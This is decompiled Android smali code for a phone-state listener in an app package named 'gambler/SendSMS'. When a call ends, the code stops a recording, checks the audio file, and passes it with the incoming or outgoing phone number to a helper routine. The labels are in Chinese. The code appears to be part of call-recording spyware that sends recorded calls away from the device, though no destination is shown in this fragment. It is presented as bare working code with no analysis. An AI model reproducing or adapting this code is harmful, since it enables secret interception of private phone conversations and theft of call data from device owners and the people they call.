.class final Lcom/gambler/SendSMS/c;
.super Landroid/telephony/PhoneStateListener;


# instance fields
.field private synthetic a:Lcom/gambler/SendSMS/MainActivity;


# direct methods
.method constructor <init>(Lcom/gambler/SendSMS/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public final onCallStateChanged(ILjava/lang/String;)V
    .locals 4

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "incomingNumber == "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    invoke-super {p0, p1, p2}, Landroid/telephony/PhoneStateListener;->onCallStateChanged(ILjava/lang/String;)V

    packed-switch p1, :pswitch_data_0

    :goto_0
    :pswitch_0
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v0}, Lcom/gambler/SendSMS/MainActivity;->f(Lcom/gambler/SendSMS/MainActivity;)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    const-string v1, ""

    iget-object v2, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-virtual {v0, v1, v2}, Lcom/gambler/SendSMS/h;->a(Ljava/lang/String;Landroid/content/Context;)V

    :cond_0
    :goto_1
    return-void

    :pswitch_1
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;Z)V

    goto :goto_0

    :pswitch_2
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    const/4 v1, 0x1

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;Z)V

    goto :goto_0

    :cond_1
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->c()V

    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v0

    if-eqz v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "recorder completed! file name == "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v1, v1, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "file size == "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v1, v1, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/gambler/SendSMS/k;->a(Ljava/lang/String;)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/gambler/SendSMS/k;->a(Ljava/lang/String;)J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-lez v0, :cond_3

    :try_start_0
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/gambler/SendSMS/k;->b(Ljava/lang/String;)La/a/a/h;

    move-result-object v0

    if-eqz p2, :cond_2

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u547c\u5165\u53f7\u7801\uff1a"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/gambler/SendSMS/k;->a(La/a/a/h;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_1

    :cond_2
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\u547c\u51fa\u53f7\u7801\uff1a"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v2}, Lcom/gambler/SendSMS/MainActivity;->b(Lcom/gambler/SendSMS/MainActivity;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/gambler/SendSMS/k;->a(La/a/a/h;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_1

    :cond_3
    iget-object v0, p0, Lcom/gambler/SendSMS/c;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v0, v0, Lcom/gambler/SendSMS/MainActivity;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->b()V

    goto/16 :goto_1

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
        :pswitch_2
    .end packed-switch
.end method
